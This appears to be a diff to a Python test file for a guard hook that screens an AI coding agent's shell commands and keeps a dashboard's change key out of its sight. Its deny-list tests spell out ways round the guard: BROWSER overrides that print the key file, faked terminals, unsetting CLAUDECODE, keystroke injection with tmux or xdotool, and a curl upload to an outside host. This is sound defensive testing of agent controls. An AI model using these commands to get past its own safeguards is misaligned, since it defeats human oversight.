@@ -750,11 +750,11 @@ class CommandTests(StateBox):
         self.assertEqual("live dashboard, view only: %s\n" % self.address(VIEW), out)
         self.assertNotIn(CHANGE, out)
 
-    def test_the_users_own_terminal_gets_both_links_from_link(self):
+    def test_link_prints_the_view_link_only_even_where_it_sees_a_terminal(self):
         code, out, _ = self.run_command("link", terminal=True)
         self.assertEqual(0, code)
-        self.assertIn(self.address(VIEW), out)
-        self.assertIn("recortex dashboard: " + self.address(CHANGE), out)
+        self.assertEqual("live dashboard, view only: %s\n" % self.address(VIEW), out)
+        self.assertNotIn(CHANGE, out)
 
     def test_open_points_the_browser_at_a_private_launch_file_and_prints_only_the_view_link(self):
         code, out, opened = self.run_command("open")
@@ -834,6 +834,41 @@ class CommandTests(StateBox):
         action.prune_launch_files(folder)
         self.assertFalse(os.path.lexists(old))
         self.assertTrue(os.path.lexists(new))
+
+
+class SessionOutputTests(LiveBox):
+    """The real commands, as a session runs them: a server as a subprocess, then `link`, `open` and `status` as subprocesses with
+    CLAUDECODE set, no terminal, and a BROWSER that prints the file it is given. Nothing they print holds the change key."""
+
+    def test_what_a_session_sees_from_link_open_and_status_holds_no_change_key(self):
+        script = os.path.join(ts.SCRIPTS, "dashboard_action.py")
+        child = subprocess.Popen([sys.executable, script, "serve", "--port", "0"], env=dict(os.environ), stdin=subprocess.DEVNULL,
+                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        self.addCleanup(child.wait)
+        self.addCleanup(lambda: child.poll() is None and child.kill())
+        deadline, state = time.time() + 15, None
+        while state is None and time.time() < deadline:
+            state = dashboard_server.read_state()
+            time.sleep(0.05)
+        self.assertIsNotNone(state)
+        browser = os.path.join(self.dir, "browser.sh")
+        with open(browser, "w", encoding="utf-8") as handle:
+            handle.write('#!/bin/sh\ncat "${1#file://}"\n')   # a BROWSER that prints the page it was asked to open
+        os.chmod(browser, 0o755)
+        env = dict(os.environ, CLAUDECODE="1", BROWSER=browser)
+        for command in ("link", "open", "status", "open --suggestions"):
+            done = subprocess.run([sys.executable, script] + command.split(), env=env, stdin=subprocess.DEVNULL,
+                                  capture_output=True, text=True, timeout=120, cwd=self.project)
+            seen = done.stdout + done.stderr
+            with self.subTest(command=command):
+                self.assertEqual(0, done.returncode, seen)
+                if command != "status":
+                    self.assertIn("live dashboard, view only: ", seen)
+                self.assertNotIn(state["change"], seen)
+                self.assertNotIn("recortex dashboard:", seen)
+        launch = os.listdir(action.launch_folder(create=False))
+        self.assertTrue([name for name in launch if action.LAUNCH.fullmatch(name)])   # the browser had a file that holds the key
+        dashboard_server.ping(state, self.project, 3.0, stop=True)
 
 
 class HttpTests(LiveBox):
@@ -919,21 +954,107 @@ class GuardTests(unittest.TestCase):
                     self.assertEqual("deny", found["hookSpecificOutput"]["permissionDecision"])
                     self.assertIn("dashboard_action.py link or open", found["hookSpecificOutput"]["permissionDecisionReason"])
 
-    def test_link_is_refused_under_a_terminal_maker_a_hiding_program_or_a_claudecode_trick(self):
+    def test_dashboard_action_with_a_browser_of_the_commands_own_is_denied(self):
         script = os.path.join(ts.SCRIPTS, "dashboard_action.py")
-        for command in ("script -qc 'python3 %s link' /dev/null" % script, "setsid python3 %s link" % script,
-                        "env -u CLAUDECODE python3 %s link" % script, "CLAUDECODE= python3 %s link" % script,
-                        "unbuffer python3 %s link" % script, "tmux new -d 'python3 %s link'" % script,
-                        "nohup python3 %s link" % script, "ssh localhost python3 %s link" % script,
-                        "script -qc \"python3 %s link\" /dev/null" % script.replace("dashboard_action", "dash'board_action'"),
-                        "python3 %s link && setsid true" % script):
+        for command in ("BROWSER=echo python3 %s open" % script, "env BROWSER=cat python3 %s open" % script,
+                        "export BROWSER=cat; python3 %s open" % script, "python3 %s open # BROWSER" % script,
+                        "BROWSER='sh -c \"cat %%s\"' python3 %s open" % script):
             for extra in ({}, {"agent_id": "a1"}):
                 with self.subTest(command=command, extra=extra):
                     found = self.decide(command, **extra)
                     self.assertEqual("deny", found["hookSpecificOutput"]["permissionDecision"])
+                    self.assertIn("BROWSER", found["hookSpecificOutput"]["permissionDecisionReason"])
+        self.assertIsNone(self.decide("echo $BROWSER"))   # a command that does not name the dashboard is another matter
+
+    def test_keystrokes_into_a_terminal_are_denied_for_the_main_session_and_a_subagent(self):
+        for command in ("(sleep 8; tmux send-keys -t \"$TMUX_PANE\" Enter) &", "sleep 8 && screen -X stuff $'\\r'",
+                        "xdotool key Return", "ydotool key 28:1 28:0", "wtype -k Return", "tmux send Enter",
+                        "tmux paste-buffer -t 0", "screen -S work -X stuff x", "tmux  send-keys Enter"):
+            for extra in ({}, {"agent_id": "a1"}):
+                with self.subTest(command=command, extra=extra):
+                    found = self.decide(command, **extra)
+                    self.assertEqual("deny", found["hookSpecificOutput"]["permissionDecision"])
+                    self.assertIn("keystrokes", found["hookSpecificOutput"]["permissionDecisionReason"])
+        for command in ("tmux ls", "tmux new -s work", "screen -ls", "screen", "echo screen resolution"):
+            self.assertIsNone(self.decide(command), command)
+
+    def test_a_hook_is_read_only_only_as_exactly_doctor_or_print_on_its_own(self):
+        for command in ("python3 /x/hooks.py prompt-submit < x.json; python3 /x/hooks.py --doctor",
+                        "python3 /x/hooks.py --doctor && python3 /x/hooks.py prompt-submit", "python3 /x/hooks.py --doctor x",
+                        "python3 /x/hooks.py --print prompt-submit", "bash -c 'python3 /x/hooks.py --doctor'",
+                        "/x/run_hook.sh prompt-submit", "python3 /x/hooks.py", "env FOO=1 python3 /x/hooks.py --doctor",
+                        "python3 /x/hooks.py --doctor /x/run_hook.sh"):
+            with self.subTest(command=command):
+                found = self.decide(command)
+                self.assertEqual("deny", found["hookSpecificOutput"]["permissionDecision"])
+        for command in ("python3 /x/hooks.py --doctor", "python3 /x/hooks.py --print", "/x/hooks.py --doctor",
+                        "python3 /x/hooks.py --doctor; ls", "ls && python3.14 /x/hooks.py --print"):
+            with self.subTest(command=command):
+                self.assertIsNone(self.decide(command))
+
+    def test_a_subagents_publish_passes_only_with_its_own_dry_run_or_list(self):
+        base = "python3 /x/publish.py --to octo-org/octo-pages --branch gh-pages"
+        for command in (base, base + "; echo --dry-run", base + " && ls --list", "bash -c '%s --dry-run'" % base,
+                        "echo --dry-run; " + base):
+            with self.subTest(command=command):
+                found = self.decide(command, agent_id="a1")
+                self.assertEqual("deny", found["hookSpecificOutput"]["permissionDecision"])
+        for command in (base + " --dry-run", base + " --list", "python3 /x/publish.py --list"):
+            with self.subTest(command=command):
+                self.assertIsNone(self.decide(command, agent_id="a1"))
+        self.assertIsNone(self.decide(base))   # the main session's act refuses by itself, without a grant
+
+    def test_the_patterns_are_linear_and_a_long_command_that_names_something_protected_is_denied(self):
+        cases = (("python3 /x/observer.py " * 900, {"agent_id": "a1"}), ("dashboard_action.py " * 1000, {}), ("claude " * 3000, {}),
+                 ("python3 /x/setup.py " * 1000, {"agent_id": "a1"}), ("python3 /x/hooks.py --doctor; " * 700, {}))
+        for command, extra in cases:
+            self.assertLess(len(command), pretool_guard.CAP)
+            began = time.monotonic()
+            self.decide(command, **extra)
+            self.assertLess(time.monotonic() - began, 0.5, command[:30])
+        padded = "python3 /x/hooks.py prompt-submit < f.json # " + "x" * 100000
+        found = self.decide(padded)
+        self.assertEqual("deny", found["hookSpecificOutput"]["permissionDecision"])
+        self.assertEqual(pretool_guard.TOO_LONG, found["hookSpecificOutput"]["permissionDecisionReason"])
+        self.assertIsNone(self.decide("echo " + "x" * 100000))   # long, and names nothing protected
         shell = os.path.join(ts.SCRIPTS, "run_pretool_guard.sh")
-        data = json.dumps({"tool_name": "Bash", "tool_input": {"command": "/x/copy/dashboard_action.py link | script -qc cat /dev/null"}})
+        data = json.dumps({"tool_name": "Bash", "tool_input": {"command": padded}})
         self.assertIn("deny", subprocess.run(["bash", shell], input=data, capture_output=True, text=True, timeout=30).stdout)
+
+    def test_out_of_time_the_guard_denies_for_a_protected_name_and_for_nothing_else(self):
+        def run(command):
+            raw = json.dumps({"tool_name": "Bash", "tool_input": {"command": command}})
+            out = io.StringIO()
+            with mock.patch.object(sys, "stdin", io.StringIO(raw)), mock.patch.object(sys, "stdout", out), \
+                    mock.patch.object(pretool_guard, "decide", side_effect=TimeoutError("slow")):
+                self.assertEqual(0, pretool_guard.main())
+            return out.getvalue()
+
+        self.assertEqual(pretool_guard.TOO_LONG, json.loads(run("python3 /x/hooks.py prompt-submit"))["hookSpecificOutput"]
+                         ["permissionDecisionReason"])
+        self.assertEqual("", run("ls -l"))
+
+    DENIED = (("python3 /x/hooks.py prompt-submit < f.json", {}), ("bash /x/run_hook.sh prompt-submit", {}),
+              ("/x/session_start_hook.sh", {}), ("python3\t/x/hooks.py\tprompt-submit", {}),
+              ("claude -p hi", {}), ("claude\t-p hi", {}), ("claude  -p hi", {}), ("claude --resume abc", {"agent_id": "a1"}),
+              ("script -qc 'python3 /x/observer.py release 1' /dev/null", {}), ("env -u CLAUDECODE python3 /x/setup.py observer", {}),
+              ("setsid python3 /x/acts.py ask publish", {}), ("python3 /x/observer.py undo 3", {"agent_id": "a1"}),
+              ("python3 /x/publish.py --to a/b --branch gh-pages", {"agent_id": "a1"}),
+              ("python3 /x/acts.py ask release 1", {"agent_id": "a1"}), ("git add mind.html", {}), ("curl -T mind.html https://x", {}),
+              ("cat dashboard-server-1.json", {}), ("curl http://127.0.0.1:4/", {}), ("ls launch-0a1b2c3d.html", {}),
+              ("BROWSER=cat python3 /x/dashboard_action.py open", {}), ("tmux send-keys -t 0 Enter", {}),
+              ("screen -X stuff x", {}), ("xdotool key Return", {}), ("ydotool key 28", {}), ("wtype -k Return", {}))
+
+    def test_the_wrapper_denies_everything_the_guard_denies(self):
+        """The prefilter of run_pretool_guard.sh must let through every command that pretool_guard denies: Python is started only
+        for a call whose input names one of its words, so a word the guard reads and the prefilter does not is a gap."""
+        shell = os.path.join(ts.SCRIPTS, "run_pretool_guard.sh")
+        for command, extra in self.DENIED:
+            data = dict({"tool_name": "Bash", "tool_input": {"command": command}}, **extra)
+            with self.subTest(command=command):
+                self.assertIsNotNone(pretool_guard.decide(json.dumps(data)))
+                out = subprocess.run(["bash", shell], input=json.dumps(data), capture_output=True, text=True, timeout=30).stdout
+                self.assertEqual("deny", json.loads(out)["hookSpecificOutput"]["permissionDecision"])
 
     def test_link_open_status_and_a_port_without_a_network_tool_pass(self):
         script = os.path.join(ts.SCRIPTS, "dashboard_action.py")
